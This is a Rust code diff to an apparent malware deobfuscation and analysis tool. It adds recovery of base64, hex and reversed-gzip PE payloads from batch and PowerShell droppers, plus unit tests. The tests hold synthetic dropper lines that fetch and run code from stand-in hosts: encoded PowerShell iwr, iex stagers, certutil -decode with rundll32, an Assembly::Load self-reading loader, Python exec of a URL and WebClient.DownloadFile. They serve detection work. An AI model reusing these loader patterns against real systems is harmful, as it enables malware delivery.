@@ -2782,6 +2782,22 @@ fn looks_like_utf16le(bytes: &[u8]) -> bool {
 /// structural signals + caps), and extracted child cmd/ps1 payloads
 /// (raw bytes plus a normalized form for the ps1 cases).
 pub fn analyze(input: &[u8], cfg: &Config) -> Report {
+    analyze_inner(input, cfg, None)
+}
+
+/// Analyze a sample while also providing its original filesystem path.
+///
+/// This lets `%~f0`/`%~n0`/`%~nx0` style self references resolve to the
+/// caller's real input name for self-extracting chains.
+pub fn analyze_with_path(
+    input: &[u8],
+    cfg: &Config,
+    file_path: impl AsRef<std::path::Path>,
+) -> Report {
+    analyze_inner(input, cfg, Some(file_path.as_ref().to_path_buf()))
+}
+
+fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBuf>) -> Report {
     let profile_enabled = std::env::var_os("HARRINGTON_PROFILE").is_some();
     let profile_start = std::time::Instant::now();
     let mut profile_last = profile_start;
@@ -2800,6 +2816,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         };
     }
     let mut env = Environment::new(cfg);
+    env.file_path = file_path;
     if cfg.self_extract {
         env.input_bytes = Some(std::sync::Arc::from(input));
     }
@@ -3114,6 +3131,10 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         let max_per_kind = cfg.max_traits_per_kind;
         dedup_traits(&mut env.traits, max_per_kind);
     }
+    collect_ps1_self_tail_reversed_gzip_pe(input, &extracted_ps1_normalized, &mut env);
+    let raw_input_text = String::from_utf8_lossy(input);
+    collect_embedded_base64_pe_carrier_artifacts(&raw_input_text, &mut env);
+    out = summarize_multiline_base64_pe_carrier_blocks(out, &mut env);
     scan_recovered_artifact_strings(&mut env);
     dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
     profile_mark!("final_scan_and_dedup");
@@ -3141,6 +3162,312 @@ fn scan_recovered_artifact_strings(env: &mut Environment) {
             deob_scan::scan_deob_text(&behavior_text, env);
         }
     }
+}
+
+fn summarize_multiline_base64_pe_carrier_blocks(text: String, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut block: Vec<&str> = Vec::new();
+    let mut changed = false;
+
+    for line in text.lines() {
+        let trimmed = line.trim();
+        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_byte);
+        if is_base64_line && (trimmed.len() >= 64 || !block.is_empty()) {
+            block.push(trimmed);
+            continue;
+        }
+        changed |= flush_base64_pe_block(&mut out, &mut block, env);
+        out.push_str(line);
+        out.push_str("\r\n");
+    }
+    changed |= flush_base64_pe_block(&mut out, &mut block, env);
+
+    if changed {
+        out
+    } else {
+        text
+    }
+}
+
+fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Environment) -> bool {
+    if block.is_empty() {
+        return false;
+    }
+
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len >= 4096 {
+        let padding = block
+            .last()
+            .map(|line| line.bytes().rev().take_while(|b| *b == b'=').count())
+            .unwrap_or(0);
+        let decoded_estimate = (total_len / 4).saturating_mul(3).saturating_sub(padding);
+        if let Some((label_kind, pe)) = decode_base64_pe_carrier_block(block) {
+            let is_hex = label_kind == "embedded-base64-hex-pe";
+            push_recovered_pe_artifact(env, label_kind, pe);
+            let description = if is_hex {
+                "multiline base64-encoded hex PE carrier"
+            } else {
+                "multiline base64 PE carrier"
+            };
+            let bytes_label = if is_hex { "hex bytes" } else { "decoded bytes" };
+            out.push_str(&format!(
+                "::==== harrington: omitted {description} ({} lines, {} base64 bytes, ~{} {bytes_label}) ====\r\n",
+                block.len(),
+                total_len,
+                decoded_estimate
+            ));
+            block.clear();
+            return true;
+        }
+        if classify_base64_pe_block(block).is_some() {
+            out.push_str(&format!(
+                "::==== harrington: omitted multiline base64 PE carrier ({} lines, {} base64 bytes, ~{} decoded bytes) ====\r\n",
+                block.len(),
+                total_len,
+                decoded_estimate
+            ));
+            block.clear();
+            return true;
+        }
+    }
+
+    for line in block.drain(..) {
+        out.push_str(line);
+        out.push_str("\r\n");
+    }
+    false
+}
+
+fn classify_base64_pe_block(block: &[&str]) -> Option<()> {
+    use base64::Engine;
+
+    let mut prefix = String::new();
+    for line in block {
+        let need = 256usize.saturating_sub(prefix.len());
+        if need == 0 {
+            break;
+        }
+        prefix.push_str(&line[..need.min(line.len())]);
+    }
+    let prefix_len = prefix.len() - (prefix.len() % 4);
+    if prefix_len < 4 {
+        return None;
+    }
+    let decoded = base64::engine::general_purpose::STANDARD
+        .decode(&prefix[..prefix_len])
+        .ok()?;
+    if decoded.starts_with(b"MZ")
+        || decoded
+            .get(..4)
+            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
+    {
+        Some(())
+    } else {
+        None
+    }
+}
+
+fn collect_embedded_base64_pe_carrier_artifacts(text: &str, env: &mut Environment) {
+    const MAX_EMBEDDED_PE_CARRIER_ARTIFACTS: usize = 16;
+
+    let mut block: Vec<&str> = Vec::new();
+    let mut recovered_count = 0usize;
+    for line in text.lines() {
+        let trimmed = line.trim();
+        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_byte);
+        if is_base64_line && (trimmed.len() >= 64 || !block.is_empty()) {
+            block.push(trimmed);
+            continue;
+        }
+        recovered_count += flush_embedded_base64_pe_artifact_block(
+            env,
+            &mut block,
+            recovered_count,
+            MAX_EMBEDDED_PE_CARRIER_ARTIFACTS,
+        );
+    }
+    flush_embedded_base64_pe_artifact_block(
+        env,
+        &mut block,
+        recovered_count,
+        MAX_EMBEDDED_PE_CARRIER_ARTIFACTS,
+    );
+}
+
+fn flush_embedded_base64_pe_artifact_block(
+    env: &mut Environment,
+    block: &mut Vec<&str>,
+    recovered_count: usize,
+    max_artifacts: usize,
+) -> usize {
+    if block.is_empty() || recovered_count >= max_artifacts {
+        block.clear();
+        return 0;
+    }
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len < 4096 {
+        block.clear();
+        return 0;
+    }
+    let decoded = decode_base64_pe_carrier_block(block);
+    block.clear();
+    let Some((label_kind, pe)) = decoded else {
+        return 0;
+    };
+    usize::from(push_recovered_pe_artifact(env, label_kind, pe))
+}
+
+fn decode_base64_pe_carrier_block(block: &[&str]) -> Option<(&'static str, Vec<u8>)> {
+    use base64::Engine;
+
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len > 16 * 1024 * 1024 {
+        return None;
+    }
+    let mut compact = String::with_capacity(total_len);
+    for line in block {
+        compact.push_str(line.trim());
+    }
+    let decoded = base64::engine::general_purpose::STANDARD
+        .decode(compact.as_bytes())
+        .ok()?;
+    if looks_like_pe(&decoded) {
+        return Some(("embedded-base64-pe", decoded));
+    }
+    if decoded.len() <= 32 * 1024 * 1024
+        && decoded
+            .get(..4)
+            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
+    {
+        let hex = String::from_utf8(decoded).ok()?;
+        let compact_hex: String = hex.chars().filter(|c| !c.is_ascii_whitespace()).collect();
+        if compact_hex.len() % 2 == 0 {
+            let bytes = hex::decode(compact_hex).ok()?;
+            if looks_like_pe(&bytes) {
+                return Some(("embedded-base64-hex-pe", bytes));
+            }
+        }
+    }
+    None
+}
+
+fn collect_ps1_self_tail_reversed_gzip_pe(
+    input: &[u8],
+    normalized_ps1: &[String],
+    env: &mut Environment,
+) {
+    use std::io::Read as _;
+
+    if !normalized_ps1.iter().any(|ps| {
+        let lc = ps.to_ascii_lowercase();
+        lc.contains("getcurrentprocess")
+            && lc.contains("readlines")
+            && lc.contains("select-object -last 1")
+            && lc.contains("frombase64string")
+            && lc.contains("gzipstream")
+            && lc.contains("[array]::reverse")
+            && lc.contains("assembly]::load")
+    }) {
+        return;
+    }
+    let raw_text = String::from_utf8_lossy(input);
+    let Some(last_line) = raw_text
+        .lines()
+        .rev()
+        .map(str::trim)
+        .find(|line| !line.is_empty())
+    else {
+        return;
+    };
+    if last_line.len() < 64 || last_line.len() > 16 * 1024 * 1024 {
+        return;
+    }
+    if !last_line.bytes().all(is_base64_byte) {
+        return;
+    }
+    let Ok(gz) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, last_line)
+    else {
+        return;
+    };
+    let mut decoder = flate2::read::GzDecoder::new(gz.as_slice());
+    let mut reversed = Vec::new();
+    if std::io::Read::take(&mut decoder, 16 * 1024 * 1024)
+        .read_to_end(&mut reversed)
+        .is_err()
+    {
+        return;
+    }
+    reversed.reverse();
+    if !looks_like_pe(&reversed) {
+        return;
+    }
+    if push_recovered_pe_artifact(env, "ps1-self-tail-reversed-gzip-pe", reversed.clone()) {
+        scan_binary_input_urls(&reversed, env);
+    }
+}
+
+fn push_recovered_pe_artifact(
+    env: &mut Environment,
+    label_kind: &'static str,
+    pe: Vec<u8>,
+) -> bool {
+    const MAX_SAME_KIND: usize = 16;
+
+    let same_kind_count = env
+        .recovered_pe
+        .iter()
+        .filter(|(label, _)| label.starts_with(label_kind))
+        .count();
+    if same_kind_count >= MAX_SAME_KIND {
+        return false;
+    }
+    if env
+        .recovered_pe
+        .iter()
+        .any(|(existing, blob)| existing.starts_with(label_kind) && blob == &pe)
+    {
+        return false;
+    }
+    let label = if same_kind_count == 0 {
+        label_kind.to_string()
+    } else {
+        format!("{label_kind}#{}", same_kind_count + 1)
+    };
+    env.recovered_pe.push((label, pe));
+    true
+}
+
+fn summarize_base64_pe_carrier_line(line: &str) -> Option<String> {
+    use base64::Engine;
+
+    let trimmed = line.trim();
+    if trimmed.len() < 4096 || trimmed.len() > 16 * 1024 * 1024 {
+        return None;
+    }
+    if !trimmed.bytes().all(is_base64_byte) {
+        return None;
+    }
+
+    let prefix_len = 256.min(trimmed.len() - (trimmed.len() % 4));
+    if prefix_len < 4 {
+        return None;
+    }
+    let decoded_prefix = base64::engine::general_purpose::STANDARD
+        .decode(&trimmed[..prefix_len])
+        .ok()?;
+    if !decoded_prefix.starts_with(b"MZ") {
+        return None;
+    }
+
+    let padding = trimmed.bytes().rev().take_while(|b| *b == b'=').count();
+    let decoded_estimate = (trimmed.len() / 4)
+        .saturating_mul(3)
+        .saturating_sub(padding);
+    Some(format!(
+        "::==== harrington: omitted base64 PE carrier ({} base64 bytes, ~{} decoded bytes) ====",
+        trimmed.len(),
+        decoded_estimate
+    ))
 }
 
 fn recovered_artifact_behavior_text(blob: &[u8]) -> String {
@@ -4005,6 +4332,9 @@ fn has_disable_delayed_expansion(input: &[u8]) -> bool {
 /// silently lose IOCs from single-line JS/PS payloads (the QF-Z2-MR family
 /// is one 582 KB JS line with `0zz0.com` URLs deep in the tail).
 fn cap_line(line: String, env: &mut Environment) -> String {
+    if let Some(summary) = summarize_base64_pe_carrier_line(&line) {
+        return summary;
+    }
     let limit = env.limits.max_output_line_bytes;
     if limit == 0 || line.len() as u64 <= limit {
         return line;
@@ -6206,6 +6536,31 @@ mod powershell_tests {
             r.deobfuscated
         );
     }
+
+    #[test]
+    fn xcopy_copied_powershell_alias_encoded_command_extracts() {
+        let payload = "iwr https://xcopy-copied-ps.example/stage";
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!(
+            "echo F | xcopy /d /q /y /h /i C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe %temp%\\Ckiczrjbb.png\r\n\
+             %temp%\\Ckiczrjbb.png -win 1 -enc {b64}\r\n",
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == "https://xcopy-copied-ps.example/stage"
+            )),
+            "xcopy renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -6731,6 +7086,139 @@ mod certutil_tests {
                 .any(|(label, blob)| label == "certutil-decode:dst.exe" && blob == &pe),
             "decoded PE was not exposed as recovered blob: {:?}",
             env.recovered_pe
+        );
+    }
+
+    #[test]
+    fn certutil_decode_skips_optional_force_flag() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("hello").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode -f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil -decode -f paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"hello"
+            ),
+            "dst.bin was not decoded: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_self_basename_resolves_with_input_path() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script = format!(
+            "certutil -decode -f %~nx0 payload.exe\r\n-----BEGIN CERTIFICATE-----\r\n{b64}\r\n-----END CERTIFICATE-----\r\n"
+        );
+
+        let report = crate::analyze_with_path(
+            script.as_bytes(),
+            &Config::default(),
+            std::path::Path::new(r"C:\Users\al\Downloads\invoice.cmd"),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "invoice.cmd" && dst == "payload.exe" && *src_resolved
+            )),
+            "self basename certutil source was not resolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label == "certutil-decode:payload.exe" && blob == &pe),
+            "self-decoded PE was not exported: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn long_pe_base64_carrier_line_is_summarized() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.resize(12_288, 0);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script = format!(
+            "findstr /V marker \"%0\" > payload.b64\r\n{b64}\r\ncertutil -decode payload.b64 payload.dll\r\nrundll32 payload.dll,x\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted base64 PE carrier"),
+            "PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..256]),
+            "raw PE base64 carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn unreachable_raw_pem_pe_carrier_is_exported() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.resize(12_289, 0);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let wrapped = b64
+            .as_bytes()
+            .chunks(64)
+            .map(|chunk| std::str::from_utf8(chunk).expect("ascii"))
+            .collect::<Vec<_>>()
+            .join("\r\n");
+        let script = format!(
+            "goto :eof\r\n-----BEGIN CERTIFICATE-----\r\n{wrapped}\r\n-----END CERTIFICATE-----\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
+            "unreachable raw PEM PE carrier was not exported: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
         );
     }
 
@@ -7858,6 +8346,52 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_getstring_base64_variable() {
+        use base64::Engine;
+
+        let filler: String = (0..2048).map(|n| format!("{n:04x}")).collect();
+        let decoded =
+            format!("Invoke-WebRequest -Uri https://b64-var.example/stage.ps1\r\n# {filler}");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var.example/stage.ps1"),
+            "base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_does_not_substitute_large_binary_base64_variable() {
+        use base64::Engine;
+
+        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
+        binary.extend((0..=255).cycle().take(12_000));
+        let b64 = base64::engine::general_purpose::STANDARD.encode(binary);
+        let ps = format!("$blob = '{b64}'; $buf = [Convert]::FromBase64String($blob)");
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("FromBase64String($blob)"),
+            "large binary base64 variable should not be substituted:\n{}",
+            normalized
+        );
+        assert_eq!(
+            normalized.matches(&b64).count(),
+            1,
+            "large base64 carrier should not be duplicated into call sites:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_convert_base64_unwraps_nested_script() {
         use base64::Engine;
         let decoded = r#"$url = "https://biteblob.example/Download/build.exe"; Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\file.exe""#;
@@ -8033,6 +8567,45 @@ mod ps1_obfuscation_tests {
         assert!(
             !normalized.to_ascii_lowercase().contains("gzipstream"),
             "gzip wrapper should be replaced by the decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_variable_gzip_function_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let filler: String = (0..1024).map(|n| format!("{n:04x}")).collect();
+        let decoded =
+            format!("Invoke-WebRequest -Uri https://gzip-func.example/stage.ps1\r\n# {filler}");
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let ps = format!(
+            r#"
+$blob = "{b64}"
+function InflateBytes ([byte[]]$bytes) {{
+    $inputStream = [IO.MemoryStream]::new($bytes)
+    $gzipStream = [IO.Compression.GZipStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
+    $outputStream = [IO.MemoryStream]::new()
+    $gzipStream.CopyTo($outputStream)
+    $outputStream.ToArray()
+}}
+$stage = [Text.Encoding]::UTF8.GetString((InflateBytes([Convert]::FromBase64String($blob)))).TrimEnd("`0")
+iex $stage
+"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://gzip-func.example/stage.ps1"),
+            "variable gzip function payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "gzip function base64 call should be replaced by decoded script:\n{}",
             normalized
         );
     }
@@ -8371,6 +8944,46 @@ exit
         assert!(
             !report.deobfuscated.contains(&b64),
             "duplicate tail payload was left in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn ps1_self_read_tail_reversed_gzip_pe_is_recovered() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let url = "https://selftail-pe.example/payload";
+        let mut pe = vec![0u8; 0x200];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.extend_from_slice(url.as_bytes());
+        let mut reversed = pe.clone();
+        reversed.reverse();
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        gz.write_all(&reversed).unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz.finish().unwrap());
+        let ps = r#"$x=[IO.File]::ReadLines(([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName.ToString()+".bat"),[text.encoding]::UTF8) | Select-Object -last 1;$b=[Convert]::FromBase64String($x);$m=New-Object System.IO.MemoryStream(,$b);$o=New-Object System.IO.MemoryStream;$g=New-Object System.IO.Compression.GzipStream $m,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);[byte[]]$p=$o.ToArray();[Array]::Reverse($p);[System.Reflection.Assembly]::Load($p)"#;
+        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+        let encoded_ps = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!("powershell -enc {encoded_ps}\r\nexit\r\n{b64}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.recovered_pe.iter().any(|(label, bytes)| label
+                .starts_with("ps1-self-tail-reversed-gzip-pe")
+                && bytes.starts_with(b"MZ")),
+            "reversed gzip PE was not recovered: {:?}",
+            report.recovered_pe
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "recovered PE URL was not extracted: {:?}",
+            report.traits
         );
     }
 
@@ -8754,6 +9367,27 @@ http.Send"#;
         assert!(
             has,
             "no Download trait from VBS concatenated variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_inline_concat_argument() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim http
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "http://vbs-inline-" & "concat.example/payload.txt", False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-inline-concat.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS inline concatenated XMLHTTP URL: {:?}",
             env.traits
         );
     }
@@ -9716,6 +10350,101 @@ $urlzip = "https://ps.example/stage.zip""#,
         assert_eq!(
             generic_count, 0,
             "Python urllib URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import urllib.request;exec(base64.b64decode(urllib.request.urlopen('https://py.example/inner').read().decode('utf-8')))";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(base64.b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_assembled_url_is_scanned_after_resolution() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"powershell -Command "(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', 'C:\Users\Public\up.bat')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && line_hint == "resolved-deob-var-fragments"
+                )
+            }),
+            "assembled URL not scanned after var-fragment resolution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_assembled_url_uses_unicode_set_bindings() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"@set "方案=https"
+@set "主机=github.com"
+@set "路径=owner/repo/raw/main/up.png"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', 'C:\Users\Public\up.bat')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && line_hint == "resolved-deob-var-fragments"
+                )
+            }),
+            "assembled URL not scanned from Unicode set bindings: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_assembled_url_inside_nested_powershell_quotes() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"@set "方案=https"
+@set "主机=github.com"
+@set "路径=owner/repo/raw/main/up.png"
+start /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', '%APPDATA%\up.bat');""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && line_hint == "resolved-deob-var-fragments"
+                )
+            }),
+            "assembled URL not scanned inside nested PowerShell quotes: {:?}",
             env.traits
         );
     }
